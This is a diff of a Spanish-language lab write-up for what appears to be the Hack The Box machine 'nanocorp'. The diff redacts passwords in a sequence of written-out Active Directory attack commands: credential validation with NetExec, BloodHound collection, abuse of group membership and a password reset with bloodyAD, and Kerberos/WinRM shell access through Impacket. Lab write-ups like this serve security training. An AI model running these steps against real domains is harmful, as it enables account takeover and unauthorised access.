@@ -136,12 +136,12 @@ hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
 Credencial obtenida:
 
 - Usuario: `web_svc`
-- Contraseña: `dksehdgh712!@#`
+- Contraseña: `[REDACTED]`
 
 Se valida el acceso mediante NetExec para confirmar que las credenciales son válidas en el dominio.
 
 ```bash
-netexec smb 10.129.56.49 -u web_svc -p 'dksehdgh712!@#'
+netexec smb 10.129.56.49 -u web_svc -p '[REDACTED]'
 ```
 
 ## Enumeración de Active Directory con BloodHound
@@ -151,7 +151,7 @@ Con credenciales válidas de `web_svc`, el siguiente paso fue mapear las relacio
 Este comando recolecta todos los datos del dominio usando las credenciales comprometidas.
 
 ```bash
-bloodhound-python -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -ns 10.129.56.49 -c all
+bloodhound-python -d nanocorp.htb -u web_svc -p '[REDACTED]' -ns 10.129.56.49 -c all
 ```
 
 La visualización en BloodHound reveló un hallazgo crítico: `web_svc` tenía privilegios para ser agregado al grupo `IT_SUPPORT`, y este grupo a su vez tenía permisos para modificar las credenciales de `monitoring_svc`.
@@ -163,19 +163,19 @@ La visualización en BloodHound reveló un hallazgo crítico: `web_svc` tenía p
 El primer paso para aprovechar la relación descubierta fue agregar a `web_svc` al grupo `IT_SUPPORT` usando `bloodyAD`.
 
 ```bash
-bloodyAD -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --host 10.129.56.49 add groupMember IT_SUPPORT web_svc
+bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 add groupMember IT_SUPPORT web_svc
 ```
 
 Una vez como miembro de `IT_SUPPORT`, se procede a resetear la contraseña de `monitoring_svc`.
 
 ```bash
-bloodyAD -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --host 10.129.56.49 set password monitoring_svc 'NewPass123!'
+bloodyAD -d nanocorp.htb -u web_svc -p '[REDACTED]' --host 10.129.56.49 set password monitoring_svc '[REDACTED]'
 ```
 
 Con la nueva contraseña, se genera un TGT de Kerberos y se utiliza Impacket para obtener una shell WinRM como `monitoring_svc` en el puerto 5986.
 
 ```bash
-getTGT.py nanocorp.htb/monitoring_svc:'NewPass123!' -dc-ip 10.129.56.49
+getTGT.py nanocorp.htb/monitoring_svc:'[REDACTED]' -dc-ip 10.129.56.49
 export KRB5CCNAME=monitoring_svc.ccache
 winrmexec.py -k -dc-ip 10.129.56.49 nanocorp.htb/monitoring_svc@DC01.nanocorp.htb
 ```
